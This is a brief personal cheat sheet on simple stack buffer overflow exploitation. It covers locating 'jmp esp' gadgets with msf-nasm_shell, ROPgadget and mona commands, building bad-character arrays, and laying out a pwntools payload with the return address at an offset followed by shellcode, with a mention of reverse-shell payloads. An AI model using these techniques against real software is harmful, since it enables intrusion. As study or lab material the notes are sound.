# simple binary exploits

## jmp esp instruction FF E4
```bash
msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
```

### find with ROPgadget
```bash
ROPgadget --binary VulnApp1.exe | grep 'jmp esp'
```

## python exploit scripts

### import pwntools
```python
from pwn import *
```

### all bad characters
```python
knownBadChars = b"\x00\x0a\x0d"
allBadChars = bytes( [r for r in range(256) if r not in knownBadChars])
```

### pwntools flat pack buffer offsets
example at offset 500 in buffer
```python
payload = flat({
    500: JMP_ESP,
    504: buf
})
```

## payload generation

### changing architecture
exe runing on linux with wine -> try linux reverse shell payload

# immunity debugger mona commands

## list loaded modules and security flags
```
!mona modules
```

## search for opcode string jmp esp

### in exe
```
!mona jmp -r esp -cpb "<BAD_CHARS>"
```

### inside module
```
!mona find -s "\xFF\xE4" -m ModuleName.exe
!mona find -s "\xFF\xE4" -m ModuleName.dll
```

